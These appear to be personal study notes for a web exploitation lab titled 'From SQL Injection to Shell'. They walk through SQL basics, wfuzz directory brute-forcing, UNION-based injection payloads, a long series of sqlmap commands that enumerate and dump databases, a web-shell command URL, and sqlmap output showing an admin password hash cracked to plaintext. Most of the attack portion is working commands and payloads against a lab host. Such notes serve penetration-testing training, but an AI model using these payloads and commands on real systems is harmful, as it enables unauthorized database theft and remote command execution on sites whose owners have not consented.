FROM SQL INJECTION TO SHELL

SQL injection

- Retrieve information using the SELECT statement.
- Update information using the UPDATE statement.
- Add new information using the INSERT statement.
- Delete information using the DELETE statement.

-> SELECT column1, column2, column3 FROM table1 WHERE column4='string1' AND column5=integer1 AND column6=integer2;
-> SELECT column1, column2, column3 FROM table1 WHERE column4='user' AND column5=3 AND column6=4;
-> SELECT id,name FROM users where ( name='test' and '1'='1' and id=3 );

	- The SELECT statement indicates the action to perform retrieve information.
	- The list of columns indicates what columns are expected.
	- The FROM table1 indicates from what tables the records are fetched.
	- The conditions following the WHERE statement are used to indicate what conditions the records should meet.
	- The string1 value is delimited by a simple quote and the integers integer1 and integer2 can be delimited by a simple quote ( integer2 ) or just put directly in the query ( integer1 ).


will retrieve from the following table:
-------------------------------------------------
column1 column2 column3 column4 column5 column6
-------------------------------------------------
1        test    Paul    user     3        13
2 		 test1   Robert  user     3         4
3 		 test33  Super   user     3         4
-------------------------------------------------


- SELECT id,name FROM users where name='test';
- SELECT id,name FROM users where name='test' and id=3;
- SELECT id,name FROM users where name='test' -- ' and id=3;
- SELECT id,name FROM users where name='test'

The attack is divided into 3 steps:

1. Fingerprinting: to gather information on the web application and
technologies in use.

2. Detection and exploitation of SQL injection: in this part, you will learn
how SQL injections work and how to exploit them in order to retrieve
information.

3. Access to the administration pages and code execution: the last step
in which you will access the operating system and run commands.

------------------
The UNION keyword
------------------

- The UNION statement is used to put together information from two requests. it is used to retrieve information from other tables.
	- SELECT id,name,price FROM articles WHERE id=3 UNION SELECT id,login,password FROM users

- The most important rule, is that both statements should return the same number of columns otherwise the database will trigger an error.


-> SELECT id,name,price FROM articles where id=1 UNION SELECT 1,2,3

---------
ORDER BY
--------- 
ORDER BY is mostly used to tell the database what column should be used to sort results.
ORDER BY can also be used to with an integer to tell the database to sort by the column number
	- SELECT firstname,lastname,age,groups FROM users ORDER BY firstname
	- SELECT firstname,lastname,age,groups FROM users ORDER BY 3

-> SELECT id,name,price FROM articles where id=1 ORDER BY 5
-> SELECT id,name,price FROM articles where id=1 ORDER BY 3 , the injection 1 ORDER BY 3




Inspecting HTTP headers
	- Burp Suite
	- OWASP Zap 

-> telnet 10.0.0.10 80
-> nc/ncat 10.0.0.10 80

-------------
HTTP Request 
-------------GET /

GET / HTTP/1.1
Host: vulnerable

------------------------------------------------------------------------------
Connected to 192.168.1.148.
Escape character is '^]'.
GET / HTTP/1.1
HTTP/1.1 400 Bad Request
Date: Thu, 08 Oct 2015 03:14:14 GMT
Server: Apache/2.2.16 (Debian)
Vary: Accept-Encoding
Content-Length: 301
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.2.16 (Debian) Server at 127.0.0.1 Port 80</address>
</body></html>
Connection closed by foreign host.
------------------------------------------------------------------------------

--------------
HTTPS Request
--------------

-> openssl s_client -connect 10.0.0.10:443

--------------------------
Directory Buster - FUZZER
--------------------------
-http://www.edge-security.com/wfuzz.php

-> python wfuzz.py -z file -f commons.txt --hc 404 http://10.0.0.10/FUZZ

-> python wfuzz.py -z file -f commons.txt --hc 404 http://10.0.0.10/FUZZ.php

--hc 404 tells wfuzz to ignore the response if the response code is 404 (Page not Found)

-z file -f wordlists/big.txt tells wfuzz to use the file wordlists/big.txt as a dictionary to brute force the remote directories' name.

- http://10.0.0.10/FUZZ tells wfuzz to replace the word FUZZ in the URL by each value found in the dictionary.


bruteforce the site 
--------------------

-> wfuzz.py -c -z file,wordlist/general/common.txt --hc 404 -o html http://www.mysite.com/FUZZ > results.html


will use a range from 1-100, and will bruteforce the parameter "id".
---------------------------------------------------------------------

-> wfuzz.py -c -z range,1-100 --hc 404 http://10.0.0.10/cat.php?id=FUZZ


See the use of POST data, with the option "-d"
----------------------------------------------

-> wfuzz.py -c -z file,wordlist/general/common.txt --hc 404 -d "id=1&catalogue=FUZZ" http://www.mysite.com/check.asp


-> wfuzz.py -c -z file,wordlist/general/common.txt --hc 404 -R 2 http://www.mysite.com/FUZZ


Path discovery, using 2 levels deep of recursivity.
----------------------------------------------------

-> wfuzz.py -z file,wordlist/general/http_methods.txt -X http://10.0.0.10

HTTP method scanning
---------------------
-> wfuzz.py -z file,wordlists/http_methods.txt -z file,wordlist/general/common.txt -X http://testphp.vulnweb.com/FUZ2Z/

HTTP method scanning example in different paths

-> wfuzz.py -z list,TRACE -z file,urls.txt -X http://FUZZ



To comment out the end of the query you can use ' -- .

===============================
Exploitation of SQL injections
===============================

Now that we know the number of columns, we can retrieve information from the database. Based on the error message we received, we know that the backend database used is MySQL.

======================================
Exploiting SQL injections with UNION
======================================
- Exploiting SQL injection using UNION follows the steps below:
	1. Find the number of columns to perform the UNION
    2. Find what columns are echoed in the page
	3. Retrieve information from the database meta-tables
	4. Retrieve information from other tables/databases


order to perform a request by SQL injection, you need to find the number of columns that are returned by the first part of the query.

There are two methods to get this information:
    1. using UNION SELECT and increase the number of columns;
    2. using ORDER BY statement.

-> SELECT id,name,price FROM articles where id=1 UNION SELECT 1,2,3 ,

for MySQL the methodology is different for other databases, the values 1,2,3,... should be changed to null,null,null, ... for database that need the same type of value in the 2 sides of the UNION keyword. For Oracle, when SELECT is used the keyword FROM needs to be used, the table dual can be used to complete the request: UNION SELECT null,null,null FROM dual






- if accessing /article.php?id=2-1 displays article1 and accessing /article.php?id=2-0 displays article2, the subtraction is performed by the database, and you're likely to have found a SQL injection.


-----------------------
Retrieving information
-----------------------

- current_user(): the user used by the PHP application to connect to the database with

-------------------
	INJECTION
-------------------
' and '1'='1
/article.php?id=2'
/article.php?id=2-1
/article.php?id=2-0
/cat.php?id=1%20UNION%20SELECT%201,@@version,3,4
/cat.php?id=1 UNION SELECT 1,current_user(),3,4
/cat.php?id=1 UNION SELECT 1,database(),3,4

http://10.0.0.10/admin/uploads/shell.php3?cmd=uname

===========
  SQLMAP
===========

-> sqlmap.py -u "http://192.168.1.148/cat.php?id=1" --dbs
-> sqlmap.py -u "http://192.168.1.148/cat.php?id=1" --users
-> sqlmap.py -u "http://192.168.1.148/cat.php?id=1" --current-user
-> sqlmap.py -u "http://192.168.1.148/cat.php?id=1" --current-db
-> sqlmap.py -u "http://192.168.1.148/cat.php?id=1" --is-dba
-> sqlmap.py -u "http://192.168.1.148/cat.php?id=1" --tables
-> sqlmap.py -u "http://192.168.1.148/cat.php?id=1" --dump
-> sqlmap.py -u "http://192.168.1.148/cat.php?id=1" -D photoblog --tables
-> sqlmap.py -u "http://192.168.1.148/cat.php?id=1" -D photoblog -T users --columns
-> sqlmap.py -u "http://192.168.1.148/cat.php?id=1" --D photoblog -T users --dump --batch

-> sqlmap.py -u "http://192.168.1.148/cat.php?id=1" --headers="X-Forwarded-For: *" --banner
-> sqlmap.py -u "http://192.168.1.148/cat.php?id=1" --headers="X-Forwarded-For: *" --dbs
-> sqlmap.py -u "http://192.168.1.148/cat.php?id=1" --headers="X-Forwarded-For: *" -D photoblog --tables
-> sqlmap.py -u "http://192.168.1.148/cat.php?id=1" --headers="X-Forwarded-For: *" -D photoblog -T users --column
-> sqlmap.py -u "http://192.168.1.148/cat.php?id=1" --headers="X-Forwarded-For: *" -D photoblog -T users --dump --batch


/cat.php?id=3 --dbms="MYSQL"
/cat.php?id=3 --dbms="MYSQL" -v 1 --dbs
/cat.php?id=3 --dbms="MYSQL" -v 1 --dump


=============
TABLE DUMPS
=============

Database: photoblog
Table: pictures
[7 entries]
+----+------------------------+-----+--------------+
| id | img                    | cat | title        |
+----+------------------------+-----+--------------+
| 1  | hacker.png             | 2   | Hacker       |
| 2  | ruby.jpg               | 1   | Ruby         |
| 3  | cthulhu.png            | 1   | Cthulhu      |
| 4  | miniwebshell.php3      | 1   | miniwebshell |
| 5  | miniwebshell.php3      | 2   | cmd          |
| 6  | miniwebshell.php3.test | 1   | minicmd      |
| 7  | miniwebshell.php3      | 1   | php3         |
+----+------------------------+-----+--------------+


Database: photoblog
Table: users

[1 entry]
+----+-------+---------------------------------------------+
| id | login | password                                    |
+----+-------+---------------------------------------------+
| 1  | admin | 8efe310f9ab3efeae8d410a8e0166eb2 (P4ssw0rd) |
+----+-------+---------------------------------------------+


Database: photoblog
Table: categories

[3 entries]
+----+--------+
| id | title  |
+----+--------+
| 1  | test   |
| 2  | ruxcon |
| 3  | 2010   |
+----+--------+

Database: photoblog
[3 tables]
+---------------------------------------+
| categories                            |
| pictures                              |
| users                                 |
+---------------------------------------+

Database: information_schema
[28 tables]
+---------------------------------------+
| CHARACTER_SETS                        |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |
| COLUMN_PRIVILEGES                     |
| ENGINES                               |
| EVENTS                                |
| FILES                                 |
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| KEY_COLUMN_USAGE                      |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| STATISTICS                            |
| TABLES                                |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TRIGGERS                              |
| USER_PRIVILEGES                       |
| VIEWS                                 |
+---------------------------------------+
